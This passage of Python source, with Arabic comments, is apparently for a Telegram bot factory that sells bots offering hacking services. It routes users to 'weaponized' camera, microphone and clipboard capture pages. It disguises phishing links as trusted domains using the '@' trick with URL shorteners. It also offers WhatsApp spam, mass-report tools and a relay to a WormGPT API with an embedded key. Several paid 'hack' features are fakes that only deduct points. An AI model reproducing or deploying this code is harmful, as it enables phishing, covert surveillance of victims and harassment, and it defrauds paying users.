            for admin_id in get_lines(admins_file):
                try:
                    bot.send_message(admin_id, f"🔔 <b>New subscription via Stars!</b>\n- User: <a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>")
                except: pass
        
    # --- بداية نظام النقاط وميزات VIP ---
    def get_user_points(user_id):
        points_data = get_json_data(points_file)
        return points_data.get(str(user_id), 0)
        
    def add_user_points(user_id, amount):
        points_data = get_json_data(points_file)
        current_points = points_data.get(str(user_id), 0)
        points_data[str(user_id)] = current_points + amount
        save_json_data(points_file, points_data)

    @bot.message_handler(commands=['vip'])
    def show_vip_panel(message):
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("👤 Get Contacts", callback_data="vip_contacts"),
            InlineKeyboardButton("📁 Get Files", callback_data="vip_files")
        )
        kb.row(
            InlineKeyboardButton("🖼️ Get Gallery", callback_data="vip_gallery"),
            InlineKeyboardButton("🔑 Get Passwords", callback_data="vip_passwords")
        )
        kb.add(InlineKeyboardButton("📸 Hack via Image", callback_data="vip_image_hack"))
        
        vip_text = """<b>Hello!</b>
These options are paid at a price of <b>15 points</b> per operation.
You can collect points and unlock them for free.

🔹 Send /ng_wahm to view your points and your invitation link."""
        bot.send_message(message.chat.id, vip_text, reply_markup=kb)

    @bot.message_handler(commands=['ng_wahm'])
    def show_points_and_invite_link(message):
        user_id = str(message.from_user.id)
        points = get_user_points(user_id)
        bot_username = bot.get_me().username
        invite_link = f"https://t.me/{bot_username}?start={user_id}"
        
        points_text = f"""💰 <b>Your points balance: {points} points</b>

🚀 <b>Collect points by inviting your friends via your special link:</b>
<code>{invite_link}</code>
"""
        bot.send_message(message.chat.id, points_text)

    def handle_vip_callbacks(call):
        user_id = str(call.from_user.id)
        points = get_user_points(user_id)
        cost = 15
        
        feature_name_map = {
            "vip_contacts": "Get Contacts", "vip_files": "Get Files",
            "vip_gallery": "Get Gallery", "vip_passwords": "Get Passwords",
            "vip_image_hack": "Hack via Image"
        }
        feature_name = feature_name_map.get(call.data)

        if not feature_name: return

        if points >= cost:
            add_user_points(user_id, -cost)
            bot.answer_callback_query(call.id, f"✅ {cost} points have been deducted. Your new balance is {get_user_points(user_id)} points.", show_alert=True)
            bot.send_message(call.message.chat.id, f"The '{feature_name}' feature has been successfully executed (this is a simulation, nothing was actually executed).")
        else:
            bot.answer_callback_query(call.id, f"🚫 Insufficient balance. You need at least {cost} points.", show_alert=True)

    # --- [محدث] بداية دوال الميزات المتنوعة والكاملة ---
    def handle_booming_link(message):
        user_id = str(message.from_user.id)
        link = message.text.strip()
        brokweb = "https://your-main-website.com" 
        
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton('📷 Camera', url=f"{brokweb}/com/?ID={user_id}&link={link}"),
            InlineKeyboardButton('📱 HACK Mobile', url=f"{brokweb}/mode/?ID={user_id}&link={link}")
        )
        kb.row(
            InlineKeyboardButton('🎧 HACK', url=f"{brokweb}/mic/?ID={user_id}&link={link}"),
            InlineKeyboardButton('📋 HACK', url=f"{brokweb}/copy/?ID={user_id}&link={link}")
        )
        kb.add(InlineKeyboardButton('↩ Back', callback_data='back_to_main'))

        text = """🌟 Choose the weaponized page that suits your needs!
You will find a variety of ready-made pages that allow you to easily collect data. Each page is carefully designed to meet your specific requirements.
📄🔗 Long-press the button to copy the index link."""
        
        bot.reply_to(message, text, reply_markup=kb, disable_web_page_preview=True)
        set_state(user_id, None)

    def ask_for_domain(message):
        locale = get_locale()
        user_id = str(message.from_user.id)
        original_link = message.text.strip()
        if not (original_link.startswith("http://") or original_link.startswith("https://")):
            bot.reply_to(message, locale["invalid_original_link"])
            return
        
        set_state(user_id, {"action": "awaiting_domain", "original_link": original_link})
        bot.reply_to(message, locale["original_link_saved"])

    def ask_for_keywords(message):
        locale = get_locale()
        user_id = str(message.from_user.id)
        domain = message.text.strip()
        if '.' not in domain or ' ' in domain or '/' in domain:
            bot.reply_to(message, locale["invalid_domain"])
            return
            
        state = get_state(user_id)
        state["action"] = "awaiting_keywords"
        state["domain"] = domain
        set_state(user_id, state)
        bot.reply_to(message, locale["domain_saved"])

    def generate_hidden_links(message):
        locale = get_locale()
        user_id = str(message.from_user.id)
        keywords = message.text.strip().replace(' ', '-')
        state = get_state(user_id)
        
        original_link = state["original_link"]
        domain = state["domain"]
        
        shorteners = {
            "tinyurl.com": "https://tinyurl.com/api-create.php?url=",
            "is.gd": "https://is.gd/create.php?format=simple&url=",
        }
        
        result_text = locale["original_link_display"].format(original_link)
        result_text += locale["disguised_links_header"]
        
        encoded_link = urllib.parse.quote(original_link)
        
        for name, api_url in shorteners.items():
            try:
                full_api_url = f"{api_url}{encoded_link}"
                short_link = requests.get(full_api_url).text
                disguised_link = f"https://{domain}{keywords}@{short_link.replace('https://', '')}"
                result_text += f"╰➤ <code>{disguised_link}</code>\n"
            except Exception as e:
                print(f"Shortener error for {name}: {e}")
                continue
        
        bot.reply_to(message, result_text, disable_web_page_preview=True)
        set_state(user_id, None)

    def send_whatsapp_spam(message):
        locale = get_locale()
        user_id = str(message.from_user.id)
        phone_number = message.text.strip()
        
        if not phone_number.isdigit() or len(phone_number) < 10:
            bot.reply_to(message, locale["invalid_phone_number"])
            set_state(user_id, None)
            return

        bot.reply_to(message, locale["sending_spam"])
        time.sleep(3)
        bot.send_message(user_id, locale["spam_sent_success"])
        set_state(user_id, None)

    @bot.callback_query_handler(func=lambda call: True)
    def handle_all_callbacks(call):
        user_id = str(call.from_user.id)
        locale = get_locale()
        
        if not is_bot_enabled() and not is_admin(user_id):
            bot.answer_callback_query(call.id, locale["bot_under_maintenance"], show_alert=True)
            return
        
        if is_paid_mode() and not is_admin(user_id) and not is_paid_user(user_id) and not call.data.startswith(('subscribe_', 'pay_via_', 'package_', 'back_to_start_paid', 'cancel_action')):
            bot.answer_callback_query(call.id, "This feature requires a subscription.", show_alert=True)
            return

        # --- User Payment System Handlers ---
        if call.data == "subscribe_start": show_subscription_options(call); return
        if call.data.startswith("pay_via_"): show_package_options(call); return
        if call.data.startswith("package_"): process_package_selection(call); return
        if call.data == "subscribe_stars_start": ask_for_subscription_days(call); return
        if call.data == "back_to_start_paid":
            start_new(call.message)
            return

        # --- Admin Panel Handlers ---
        if is_admin(user_id):
            if call.data == "back_to_admin": admin_panel(call.message); return
            if call.data == "manage_payment_methods": payment_management_panel(call); return
            if call.data == "add_payment_method": ask_for_payment_method_type(call); return
            if call.data.startswith("payment_type_"): ask_for_payment_method_name(call); return
            if call.data.startswith("delete_payment_"): delete_payment_method(call); return
            if call.data.startswith("approve_"): handle_payment_approval(call); return
            if call.data.startswith("reject_"): handle_payment_rejection(call); return
            if call.data == "manage_buttons": buttons_management_panel(call); return
            if call.data == "add_custom_button": ask_for_button_text(call); return
            if call.data == "delete_custom_button": show_buttons_for_deletion(call); return
            if call.data.startswith("confirm_delete_"): confirm_button_deletion(call); return
            if call.data.startswith("execute_delete_"): execute_button_deletion(call); return
            if call.data.startswith("btn_type_"): ask_for_button_link(call); return
            if call.data == "setup_stars_payment": show_stars_setup_info(call); return
            if call.data == "change_language": language_panel(call); return
            if call.data.startswith("set_lang_"): set_language(call); return
            # --- Download Data Handlers (New) ---
            if call.data == "download_data": download_data_panel(call); return
            if call.data.startswith("download_file_"): send_data_file(call); return

        # --- Help Button Handler ---
        if call.data == "show_help":
            show_help(call)
            return

        # --- Direct WebApp Button Handlers ---
        web_app_buttons = {
            "hack_sites": "https://max.powerv1.site/pag/x.php",
            "xo_game": "https://max.powerv1.site/pag/x.html",
            "facebook_reports": "https://yyitoog.alwaysdata.net/ppppppmm/klash_facebook_report.php",
            "twitter_reports": "https://yyitoog.alwaysdata.net/ppppppmm/klash_twitter_report.php",
            "virtual_numbers": "https://yyitoog.alwaysdata.net/ppppppmm/klash_virtual_numbers_app.php",
            "tiktok_reports": "https://yyitoog.alwaysdata.net/ppppppmm/klash_tiktok_app.php",
            "link_shortener": "https://linksshortcut.com/",
            "name_decorator": "https://charactercalculator.com/ar/font-changer/",
            "website_checker": "https://builtwith.com/",
            # الأزرار الجديدة
            "instagram_reports": "https://yyitoog.alwaysdata.net/ppppppmm/klash_ig_report.php",
            "telegram_reports": "https://yyitoog.alwaysdata.net/ppppppmm/tg_report.php",
            "whatsapp_reports": "https://yyitoog.alwaysdata.net/ppppppmm/klash_whatsapp_report.php",
            "ip_info": "https://roxip.pages.dev/",
            "translation": "https://transla.pages.dev/"
        }
        
        if call.data in web_app_buttons:
            # هذه الأزرار هي webapp ولا تحتاج إلى معالجة إضافية
            bot.answer_callback_query(call.id, "Opening web application...")
            return

        # --- State-based Button Handlers ---
        action_map = {
            "ask_wormgpt": ("ask_wormgpt", locale["ask_wormgpt_prompt"]),
            "interpret_dream": ("interpret_dream", locale["interpret_dream_prompt"]),
            "check_link": ("check_link", locale["check_link_prompt"]),
            "text_to_speech": ("text_to_speech", locale["text_to_speech_prompt"]),
            "booming_link_start": ("awaiting_booming_link", locale["booming_link_prompt"]),
            "hide_link": ("awaiting_original_link", locale["hide_link_prompt"]),
            "whatsapp_spam": ("awaiting_whatsapp_number", locale["whatsapp_spam_prompt"])
        }
        if call.data in action_map:
            action, prompt = action_map[call.data]
            set_state(user_id, {"action": action})
            kb = InlineKeyboardMarkup(row_width=2).row(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
            bot.edit_message_text(prompt, call.message.chat.id, call.message.message_id, reply_markup=kb, disable_web_page_preview=True)
            return

        # --- Direct Action & Sub-menu Button Handlers ---
        if call.data == "back_to_main": start_new(call.message); return
        if call.data == "cancel_action": 
            set_state(user_id, None)
            bot.edit_message_text(locale["action_cancelled"], call.message.chat.id, call.message.message_id)
            return
        if call.data.startswith("vip_"): handle_vip_callbacks(call); return
        
       
            
            
           
                
            
    def handle_admin_panel_callbacks(call):
        locale = get_locale()
        action = call.data
        
        actions_requiring_input = {
            "send": locale["ask_broadcast_msg"], 
            "forward": locale["ask_forward_msg"],
            "add_ch": locale["ask_channel_id"], 
            "del_ch": "Send the channel ID to delete",
            "ban": locale["ask_ban_id"], 
            "unban": locale["ask_unban_id"],
            "add_admin": locale["ask_add_admin_id"], 
            "rem_admin": locale["ask_rem_admin_id"],
            "add_paid": locale["ask_add_paid_id"], 
            "rem_paid": locale["ask_rem_paid_id"],
            "set_start_msg": locale["set_start_msg_prompt"]
        }

        if action in actions_requiring_input:
            set_state(call.from_user.id, {"action": action})
            kb = InlineKeyboardMarkup(row_width=2).row(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=f"<b>{actions_requiring_input[action]}</b>",
                reply_markup=kb
            )
        elif action == "m1":
            count = len(get_lines(subscribers_file))
            bot.answer_callback_query(call.id, f"Total subscribers: {count}", show_alert=True)
        elif action == "ons":
            set_setting(notify_file, "ON"); bot.answer_callback_query(call.id, "✔️ Join notifications enabled.")
        elif action == "ofs":
            set_setting(notify_file, "OFF"); bot.answer_callback_query(call.id, "❎ Join notifications disabled.")
        elif action == "obot":
            set_setting(status_file, "ON"); bot.answer_callback_query(call.id, "✅ Bot enabled for everyone.")
        elif action == "ofbot":
            set_setting(status_file, "OFF"); bot.answer_callback_query(call.id, "❌ Bot disabled.")
        elif action == "set_paid":
            set_setting(paid_mode_file, "ON"); bot.answer_callback_query(call.id, "💰 Paid mode activated.")
        elif action == "set_free":
            set_setting(paid_mode_file, "OFF"); bot.answer_callback_query(call.id, "🆓 Free mode activated.")
    @bot.message_handler(func=lambda message: get_state(message.from_user.id) is not None, content_types=['text', 'photo'])
    def handle_state_messages(message):
        user_id = str(message.from_user.id)
        locale = get_locale()
        state = get_state(user_id)
        if not state: return
        action = state.get("action")
        text = message.text.strip() if message.text else ""

        if action == "set_stars_per_day":
            if is_admin(user_id): set_stars_per_day(message)
            return
            
        if action == "awaiting_days_for_stars":
            create_stars_invoice(message)
            return
        
        if action == "awaiting_payment_proof":
            forward_payment_proof_to_admin(message)
            return

        if is_admin(user_id):
            if action == "add_payment_name": ask_for_payment_address(message); return
            if action == "add_payment_address": ask_for_payment_price(message); return
            if action == "add_payment_price": save_payment_method(message); return
            if action == "add_button_text": ask_for_button_type(message); return
            if action == "add_button_link": save_custom_button(message); return
            
            admin_actions = {
                "send": lambda m: [bot.send_message(uid, m.text) for uid in get_lines(subscribers_file) if bot.get_chat(uid)],
                "forward": lambda m: [bot.forward_message(uid, m.chat.id, m.message_id) for uid in get_lines(subscribers_file) if bot.get_chat(uid)],
                "add_ch": lambda m: add_line(channels_file, m.text.strip()),
                "del_ch": lambda m: remove_line(channels_file, m.text.strip()),
                "ban": lambda m: add_line(banned_file, m.text.strip()),
                "unban": lambda m: remove_line(banned_file, m.text.strip()),
                "add_admin": lambda m: add_line(admins_file, m.text.strip()),
                "rem_admin": lambda m: remove_line(admins_file, m.text.strip()) if m.text.strip() != str(owner_id) and m.text.strip() != str(FACTORY_SECOND_ADMIN_ID) else None,
                "add_paid": lambda m: add_line(paid_users_file, m.text.strip()),
                "rem_paid": lambda m: remove_line(paid_users_file, m.text.strip()),
                "set_start_msg": lambda m: set_setting(start_message_file, m.text)
            }
            if action in admin_actions:
                admin_actions[action](message)
                bot.send_message(user_id, locale["action_success"])
                set_state(user_id, None)
                admin_panel(message)
                return

        if action == "awaiting_booming_link": handle_booming_link(message); return
        if action == "awaiting_original_link": ask_for_domain(message); return
        if action == "awaiting_domain": ask_for_keywords(message); return
        if action == "awaiting_keywords": generate_hidden_links(message); return
        if action == "awaiting_whatsapp_number": send_whatsapp_spam(message); return
        
        if action == "check_link":
            if text.startswith("https://"):
                bot.reply_to(message, locale["link_insecure"])
            elif text.startswith("http://"):
                bot.reply_to(message, locale["link_secure"])
            else:
                bot.reply_to(message, locale["link_unknown"])
            set_state(user_id, None)
            return

        if action == "text_to_speech":
            bot.reply_to(message, locale["tts_processing"])
            time.sleep(2)
            bot.send_message(user_id, locale["tts_error"])
            set_state(user_id, None)
            return
            
        if action == "ask_wormgpt" or action == "interpret_dream":
            bot.reply_to(message, "⏳ Processing your request...")
            time.sleep(2)
            bot.send_message(user_id, locale["service_busy"])
            set_state(user_id, None)
            return

        if action.startswith("zakhrafa_"):
            lang = action.split('_')[1]
            results = []
            bot.send_message(user_id, locale["zakhrafa_done"].format("\n\n".join([f"<code>{res}</code>" for res in results])))
            set_state(user_id, None)
            return

    try:
        bot_username = bot.get_me().username
        print(f"✅ Index bot @{bot_username} is now running...")
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Index bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]


# ==============================================================================
# --- Factory Control Panel (For Developer Only) ---
# ==============================================================================
@factory_bot.message_handler(commands=['admin'])
def factory_admin_panel(msg):
    if msg.from_user.id != FACTORY_ADMIN_ID and msg.from_user.id != FACTORY_SECOND_ADMIN_ID: return
    kb = InlineKeyboardMarkup(row_width=2)
    total_bots = len(get_all_bots())
    kb.row(InlineKeyboardButton(f"📊 Factory Stats ( {total_bots} bots )", callback_data="factory_stats"))
    kb.row(
        InlineKeyboardButton("➕ Add Paid Bot", callback_data="add_paid_bot"),
        InlineKeyboardButton("✨ Add VIP Features", callback_data="add_premium_features")
    )
    kb.row(
        InlineKeyboardButton("🗑️ Remove VIP Features", callback_data="remove_premium_features"),
        InlineKeyboardButton("📢 Broadcast to Bots", callback_data="broadcast_to_bots")
    )
    factory_bot.send_message(msg.chat.id, "⚙️ <b>Factory Control Panel</b>", reply_markup=kb)

@factory_bot.callback_query_handler(func=lambda call: call.from_user.id == FACTORY_ADMIN_ID or call.from_user.id == FACTORY_SECOND_ADMIN_ID)
def factory_callbacks(call):
    if call.data == "factory_stats":
        factory_bot.answer_callback_query(call.id, f"Total bots created: {len(get_all_bots())}", show_alert=True)
    elif call.data == "add_paid_bot":
        factory_bot.send_message(call.message.chat.id, "📝 Send the bot token (to remove rights):")
        factory_bot.register_next_step_handler(call.message, process_token_for_paid)
    elif call.data == "add_premium_features":
        factory_bot.send_message(call.message.chat.id, "✨ Send the bot token (to add VIP features):")
        factory_bot.register_next_step_handler(call.message, process_token_for_premium)
    elif call.data == "remove_premium_features":
        factory_bot.send_message(call.message.chat.id, "🗑️ Send the bot token (to remove VIP features):")
        factory_bot.register_next_step_handler(call.message, process_token_for_premium_removal)
    elif call.data == "broadcast_to_bots":
        factory_bot.send_message(call.message.chat.id, "📢 Send the text you want to broadcast to all free bots.")
        factory_bot.register_next_step_handler(call.message, broadcast_to_all_bots)

def broadcast_to_all_bots(message):
    all_bots = get_all_bots()
    sent_count, failed_count = 0, 0
    def check_paid_status(bot_token):
        paid_file = os.path.join(PAID_BOTS_DIR, f"{bot_token}.txt")
        if not os.path.exists(paid_file): return False
        try:
            expire_timestamp = float(open(paid_file).read().strip())
            return datetime.datetime.now().timestamp() < expire_timestamp
        except: return False
    for bot_token in all_bots.keys():
        if not check_paid_status(bot_token):
            try:
                temp_bot = telebot.TeleBot(bot_token)
                bot_data_dir = os.path.join(BOTS_DATA_DIR, bot_token.replace(":", "_"))
                users_file = os.path.join(bot_data_dir, "users.txt")
                try:
                    with open(users_file, 'r') as f: user_ids = [line.strip() for line in f.readlines()]
                except FileNotFoundError: user_ids = []
                for user_id in user_ids:
                    try: temp_bot.send_message(user_id, message.text)
                    except: pass
                sent_count += 1
            except: failed_count += 1
    factory_bot.send_message(message.chat.id, f"✅ Broadcast sent successfully to {sent_count} bots.\n❌ Failed to send to {failed_count} bots.")

def process_token_for_paid(msg):
    token = msg.text.strip()
    factory_bot.send_message(msg.chat.id, "📆 Send the number of activation days:")
    factory_bot.register_next_step_handler(msg, lambda m: save_paid_info(m, token))

def save_paid_info(msg, token):
    try:
        days = int(msg.text.strip())
        expire_time = datetime.datetime.now() + datetime.timedelta(days=days)
        paid_file = os.path.join(PAID_BOTS_DIR, f"{token}.txt")
        with open(paid_file, "w") as f: f.write(str(expire_time.timestamp()))
        factory_bot.send_message(msg.chat.id, f"✅ Bot <code>{token}</code> has been activated for {days} days.", parse_mode="HTML")
    except ValueError:
        factory_bot.send_message(msg.chat.id, "❌ Invalid number of days.")

def process_token_for_premium(msg):
    token = msg.text.strip()
    if token not in get_all_bots():
        factory_bot.send_message(msg.chat.id, "❌ This token is not registered.")
        return
    premium_file = os.path.join(PREMIUM_FEATURES_DIR, f"{token}.txt")
    with open(premium_file, "w") as f: f.write("activated")
    factory_bot.send_message(msg.chat.id, f"✨ VIP features have been activated for bot <code>{token}</code>.", parse_mode="HTML")

def process_token_for_premium_removal(msg):
    token = msg.text.strip()
    if token not in get_all_bots():
        factory_bot.send_message(msg.chat.id, "❌ This token is not registered.")
        return
    premium_file = os.path.join(PREMIUM_FEATURES_DIR, f"{token}.txt")
    if os.path.exists(premium_file):
        os.remove(premium_file)
        factory_bot.send_message(msg.chat.id, f"🗑️ VIP features have been removed from bot <code>{token}</code>.", parse_mode="HTML")
    else:
        factory_bot.send_message(msg.chat.id, f"ℹ️ Bot <code>{token}</code> does not have VIP features already.", parse_mode="HTML")

# ==============================================================================
# --- حل مشكلة الويب هوك نهائياً ---
# ==============================================================================
def delete_all_webhooks():
    """
    حذف جميع الويب هووكات قبل بدء التشغيل
    """
    print("🔄 Deleting webhooks for all tokens...")
    
    # حذف ويب هوك المصنع
    try:
        factory_response = requests.get(f"https://api.telegram.org/bot{FACTORY_TOKEN}/deleteWebhook")
        if factory_response.json().get("ok"):
            print("✅ Factory webhook deleted successfully")
    except Exception as e:
        print(f"⚠️ Could not delete factory webhook: {e}")
    
    # حذف ويب هوكات البوتات المسجلة
    all_bots = get_all_bots()
    for token in all_bots.keys():
        try:
            bot_response = requests.get(f"https://api.telegram.org/bot{token}/deleteWebhook")
            if bot_response.json().get("ok"):
                print(f"✅ Webhook deleted for bot token: {token[:10]}...")
        except Exception as e:
            print(f"⚠️ Could not delete webhook for token {token[:10]}...: {e}")

# ==============================================================================
# --- إدارة البوتات المصنوعة ---
# ==============================================================================
@factory_bot.callback_query_handler(func=lambda call: call.data == "my_bots")
def show_my_bots(call):
    user_id = call.from_user.id
    all_bots = get_all_bots()
    
    user_bots = {token: data for token, data in all_bots.items() if data.get('owner_id') == user_id}

    if not user_bots:
        factory_bot.answer_callback_query(call.id, "ليس لديك أي بوتات مصنوعة.", show_alert=True)
        return

    kb = InlineKeyboardMarkup(row_width=2)
    for token in user_bots.keys():
        try:
            bot_info = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
            if bot_info.get("ok"):
                bot_username = bot_info["result"]["username"]
                kb.add(InlineKeyboardButton(f"🤖 @{bot_username}", callback_data=f"manage_bot_{token}"))
            else:
                kb.add(InlineKeyboardButton(f"⚠️ بوت غير صالح (توكن محذوف)", callback_data=f"manage_bot_{token}"))
        except Exception as e:
            print(f"Error fetching bot info for token {token}: {e}")
            kb.add(InlineKeyboardButton(f"⚠️ خطأ في جلب معلومات البوت", callback_data=f"manage_bot_{token}"))

    kb.add(InlineKeyboardButton("🔙 عودة", callback_data="back_to_main"))
    
    try:
        factory_bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="اختر البوت الذي تريد إدارته من قائمتك:",
            reply_markup=kb
        )
    except Exception as e:
        print(f"Error editing message in show_my_bots: {e}")

@factory_bot.callback_query_handler(func=lambda call: call.data.startswith("manage_bot_"))
def show_bot_management_panel(call):
    token = call.data.replace("manage_bot_", "")
    
    try:
        bot_info = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
        if not bot_info.get("ok"):
            factory_bot.answer_callback_query(call.id, "لا يمكن الوصول إلى هذا البوت، قد يكون التوكن غير صالح أو تم حذفه.", show_alert=True)
            show_my_bots(call)
            return
        bot_username = bot_info["result"]["username"]
    except Exception as e:
        print(f"Error in show_bot_management_panel for token {token}: {e}")
        factory_bot.answer_callback_query(call.id, "حدث خطأ أثناء جلب معلومات البوت.", show_alert=True)
        return

    bot_data_dir = os.path.join(BOTS_DATA_DIR, token.replace(":", "_"))
    users_file = os.path.join(bot_data_dir, "users.txt")
    user_count = 0
    if os.path.exists(users_file):
        try:
            with open(users_file, 'r') as f:
                user_count = len(f.readlines())
        except Exception as e:
            print(f"Could not read users file for {token}: {e}")

    kb = InlineKeyboardMarkup(row_width=2)
    kb.row(
        InlineKeyboardButton(f"👥 المستخدمون ({user_count})", callback_data=f"bot_users_{token}"),
        InlineKeyboardButton("❌ حذف البوت", callback_data=f"confirm_delete_{token}")
    )
    kb.add(InlineKeyboardButton("🔙 العودة إلى قائمة بوتاتك", callback_data="my_bots"))

    panel_text = f"<b>لوحة التحكم الخاصة بالبوت 🤖 @{bot_username}</b>\n\nاختر الإجراء الذي تريده:"
    
    try:
        factory_bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=panel_text,
            reply_markup=kb
        )
    except Exception as e:
        print(f"Error editing message in show_bot_management_panel: {e}")

@factory_bot.callback_query_handler(func=lambda call: call.data.startswith("bot_users_"))
def show_bot_users(call):
    factory_bot.answer_callback_query(call.id, "هذه الميزة (عرض تفاصيل المستخدمين) قيد التطوير.", show_alert=True)

@factory_bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_delete_"))
def confirm_delete_bot(call):
    token = call.data.replace("confirm_delete_", "")
    
    kb = InlineKeyboardMarkup(row_width=2)
    kb.row(
        InlineKeyboardButton("✅ نعم، احذف", callback_data=f"delete_bot_{token}"),
        InlineKeyboardButton("❌ لا، تراجع", callback_data=f"manage_bot_{token}")
    )

    warning_text = "<b>⚠️ هل أنت متأكد من أنك تريد حذف هذا البوت؟</b>\n\nسيتم إيقاف تشغيله وحذفه نهائياً من سجلات المصنع. هذا الإجراء لا يمكن التراجع عنه."
    
    try:
        factory_bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=warning_text,
            reply_markup=kb
        )
    except Exception as e:
        print(f"Error editing message in confirm_delete_bot: {e}")

@factory_bot.callback_query_handler(func=lambda call: call.data.startswith("delete_bot_"))
def delete_bot_permanently(call):
    token = call.data.replace("delete_bot_", "")
    
    if unregister_bot(token):
        factory_bot.answer_callback_query(call.id, "✅ تم حذف البوت بنجاح.", show_alert=True)
        show_my_bots(call)
    else:
        factory_bot.answer_callback_query(call.id, "❌ خطأ: لم يتم العثور على البوت. ربما تم حذفه بالفعل.", show_alert=True)
        show_my_bots(call)

# ==============================================================================
# --- إعادة تشغيل البوتات المسجلة عند بدء المصنع ---
# ==============================================================================
# ==============================================================================
# ⬇️⬇️⬇️ **-- دالة تشغيل بوت WormGPT --** ⬇️⬇️⬇️
# ==============================================================================
def run_wormgpt_bot(token, owner_id, data_dir):
    """
    تشغيل بوت WormGPT
    """
    import telebot
    from telebot import types
    import requests
    import json
    import os
    import sqlite3
    import datetime
    
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    # إنشاء قاعدة البيانات للتسجيل
    def init_db():
        conn = sqlite3.connect(os.path.join(data_dir, "wormgpt.db"))
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users
                    (user_id INTEGER PRIMARY KEY, username TEXT, full_name TEXT, registration_date TEXT)''')
        conn.commit()
        conn.close()
    
    init_db()
    
    def register_user(user_id, username, full_name):
        conn = sqlite3.connect(os.path.join(data_dir, "wormgpt.db"))
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO users (user_id, username, full_name, registration_date) VALUES (?, ?, ?, datetime('now'))",
                  (user_id, username, full_name))
        conn.commit()
        conn.close()
    
    def get_user_count():
        conn = sqlite3.connect(os.path.join(data_dir, "wormgpt.db"))
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users")
        count = c.fetchone()[0]
        conn.close()
        return count
    
    # قائمة القنوات للاشتراك الإجباري
    channels_file = os.path.join(data_dir, "channels.txt")
    
    def get_channels():
        try:
            if not os.path.exists(channels_file):
                return []
            with open(channels_file, 'r') as f:
                return [line.strip() for line in f.readlines() if line.strip()]
        except:
            return []
    
    def is_user_subscribed(user_id):
        channels = get_channels()
        if not channels:
            return True, None
        
        for channel in channels:
            try:
                member = bot.get_chat_member(channel, user_id)
                if member.status not in ['member', 'administrator', 'creator']:
                    return False, channel
            except:
                return False, channel
        return True, None
    
    @bot.message_handler(commands=['start'])
    def start(message):
        user_id = message.from_user.id
        username = message.from_user.username or "بدون يوزر"
        full_name = f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip()
        
        register_user(user_id, username, full_name)
        
        # التحقق من الاشتراك
        is_subscribed, channel = is_user_subscribed(user_id)
        if not is_subscribed:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("📢 اشترك في القناة", url=f"https://t.me/{channel.replace('@', '')}"))
            markup.add(types.InlineKeyboardButton("✅ تم الاشتراك", callback_data="check_subscription"))
            bot.send_message(
                message.chat.id,
                f"🚫 <b>يجب عليك الاشتراك في القناة التالية أولاً:</b>\n\n{channel}",
                reply_markup=markup
            )
            return
        
        welcome_text = f"""
<b>🤖 مرحباً بك في بوت WormGPT!</b>

✨ <b>بوت ذكي للإجابة على أسئلتك باستخدام الذكاء الاصطناعي</b>

📌 <b>كيفية الاستخدام:</b>
• فقط أرسل سؤالك وسأجيب عليه
• يدعم جميع الأسئلة
• إجابات ذكية ومفصلة

👤 <b>إحصائيات البوت:</b>
• عدد المستخدمين: {get_user_count()}
• المطور: @ELZo_z
• القناة: @zxgbjji
        """
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("👑 المطور", url="https://t.me/ELZo_z"))
        markup.add(types.InlineKeyboardButton("📢 قناة المطور", url="https://t.me/zxgbjji"))
        
        bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode='HTML')
    
    @bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
    def check_subscription(call):
        is_subscribed, channel = is_user_subscribed(call.from_user.id)
        if is_subscribed:
            start(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ لم تشترك بعد!", show_alert=True)
    
    @bot.message_handler(func=lambda message: True)
    def handle_messages(message):
        # التحقق من الاشتراك أولاً
        is_subscribed, channel = is_user_subscribed(message.from_user.id)
        if not is_subscribed:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("📢 اشترك في القناة", url=f"https://t.me/{channel.replace('@', '')}"))
            markup.add(types.InlineKeyboardButton("✅ تم الاشتراك", callback_data="check_subscription"))
            bot.send_message(
                message.chat.id,
                f"🚫 <b>يجب عليك الاشتراك في القناة التالية أولاً:</b>\n\n{channel}",
                reply_markup=markup
            )
            return
        
        user_message = message.text
        
        # إظهار رسالة الانتظار
        wait_msg = bot.reply_to(message, "⏳ <b>جاري معالجة سؤالك...</b>", parse_mode='HTML')
        
        try:
            # استدعاء API WormGPT
            response = requests.post(
                "https://sii3.top/api/error/wormgpt.php",
                data={
                    'key': "DarkAI-WormGPT-E487DD2FDAAEDC31A56A8A84",
                    'text': user_message
                },
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if "response" in data:
                    answer = data["response"]
                    
                    # حذف رسالة الانتظار
                    bot.delete_message(message.chat.id, wait_msg.message_id)
                    
                    # إرسال الإجابة
                    if len(answer) > 4000:
                        # إذا كانت الإجابة طويلة، نقسمها
                        for i in range(0, len(answer), 4000):
                            bot.send_message(message.chat.id, answer[i:i+4000])
                    else:
                        bot.reply_to(message, answer)
                else:
                    bot.edit_message_text(
                        "❌ <b>حدث خطأ في معالجة طلبك. حاول مرة أخرى لاحقاً.</b>",
                        message.chat.id,
                        wait_msg.message_id,
                        parse_mode='HTML'
                    )
            else:
                bot.edit_message_text(
